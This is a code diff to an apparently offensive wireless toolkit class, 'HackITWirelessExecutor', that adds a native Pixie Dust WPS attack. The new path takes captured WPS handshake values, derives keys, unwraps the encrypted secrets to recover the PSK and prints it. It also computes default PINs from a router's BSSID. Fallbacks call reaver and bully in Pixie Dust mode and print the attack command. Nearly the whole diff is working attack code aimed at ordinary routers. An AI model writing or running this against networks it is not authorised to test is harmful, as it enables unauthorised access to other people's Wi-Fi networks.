@@ -2166,6 +2166,58 @@ class HackITWirelessExecutor:
         if not bssid:
             UI.print_error("Specify BSSID.")
             return
+
+        # ── Native Pixie Dust derivation path ────────────────────────
+        # When the operator supplies the captured M1/M2 material (degenerate
+        # pkr, PKE, wrapped E-S1/E-S2 from a monitor capture) we run the real
+        # crypto: DH(0) → DHKey → KDK → AES-128 RFC 3394 unwrap → PSK. This is
+        # the actual Pixie Dust break, no external binary needed.
+        pke = kwargs.get("pke")
+        pkr = kwargs.get("pkr")
+        es1 = kwargs.get("es1")
+        es2 = kwargs.get("es2")
+        enrollee_mac = kwargs.get("enrollee_mac")
+        registrar_mac = kwargs.get("registrar_mac")
+        enrollee_nonce = kwargs.get("enrollee_nonce")
+        registrar_nonce = kwargs.get("registrar_nonce")
+
+        if es1 is not None and es2 is not None:
+            try:
+                from . import wps_engine
+                import binascii
+                def _b(v, default=None):
+                    if v is None:
+                        return default if default is not None else b""
+                    if isinstance(v, (bytes, bytearray)):
+                        return bytes(v)
+                    return binascii.unhexlify(str(v).replace(":", ""))
+                es1_b, es2_b = _b(es1), _b(es2)
+                res = wps_engine.pixie_dust_attack(
+                    pke=int(pke, 0) if isinstance(pke, str) else (pke or 0),
+                    pkr=int(pkr, 0) if isinstance(pkr, str) else (pkr or 0),
+                    e_s1=es1_b, e_s2=es2_b,
+                    enrollee_mac=_b(enrollee_mac, bytes(6)),
+                    registrar_mac=_b(registrar_mac, bytes.fromhex(bssid.replace(":", ""))),
+                    enrollee_nonce=_b(enrollee_nonce, bytes(16)),
+                    registrar_nonce=_b(registrar_nonce, bytes(16)),
+                    aes_unwrap=self.bridge.c_aes_unwrap,
+                )
+                if res.ok:
+                    UI.print_success("Pixie Dust: PSK recovered")
+                    _console.print(f"  [cyan]PSK [/cyan]{res.psk}")
+                    _console.print(f"  [cyan]E-S1[/cyan]{res.es1.hex() if res.es1 else '-'}")
+                    _console.print(f"  [cyan]E-S2[/cyan]{res.es2.hex() if res.es2 else '-'}")
+                    default_pin = wps_engine.WpsCrypto.pin_from_bssid(bssid)
+                    if default_pin:
+                        _console.print(f"  [cyan]default PIN[/cyan] {default_pin}")
+                    return
+                UI.print_error(f"Pixie Dust derivation failed: {res.reason}")
+                return
+            except Exception as e:
+                UI.print_error(f"Pixie Dust crypto error: {e}")
+                return
+
+        # ── External-tool path (reaver / bully / pixiewps) ───────────
         if shutil.which("reaver"):
             cmd = ["reaver", "-i", iface, "-b", bssid, "-K", "-vv"]
             if pin:
@@ -2178,14 +2230,28 @@ class HackITWirelessExecutor:
                 cmd.extend(["-p", pin])
             UI.print_info(f"bully PixieDust attack on {bssid}...")
             subprocess.run(cmd)
+        elif shutil.which("pixiewps"):
+            # Capture-less fallback: derive the default PIN and hand it off.
+            from . import wps_engine
+            default_pin = wps_engine.WpsCrypto.pin_from_bssid(bssid)
+            UI.print_info(f"pixiewps present — default PIN candidate for {bssid}: {default_pin}")
+            UI.print_info("For the full break, capture M1/M2 and pass --es1/--es2/--pke/--pkr.")
         else:
             try:
                 proc = self.bridge.rust_wps_pixie(iface, bssid, pin)
                 for line in proc.stdout:
                     _console.print(f"  {line.strip()}")
                 proc.wait()
-            except EngineBuildError:
-                UI.print_error("No WPS tools available. Install reaver or bully.")
+            except (EngineBuildError, Exception):
+                from . import wps_engine
+                default_pin = wps_engine.WpsCrypto.pin_from_bssid(bssid)
+                UI.print_warning("No WPS tool (reaver/bully/pixiewps) installed.")
+                UI.print_info(f"Default PIN candidate from BSSID: {default_pin}")
+                UI.print_info("Full Pixie Dust: capture M1/M2, then:")
+                UI.print_info(
+                    f"  wps pixie {iface} {bssid} --es1 <hex> --es2 <hex> "
+                    f"--pke <int> --pkr 0"
+                )
 
     def do_wps_pin(self, bssid: str, all_pins: bool = False, **kwargs):
         if not bssid or len(bssid) < 17:
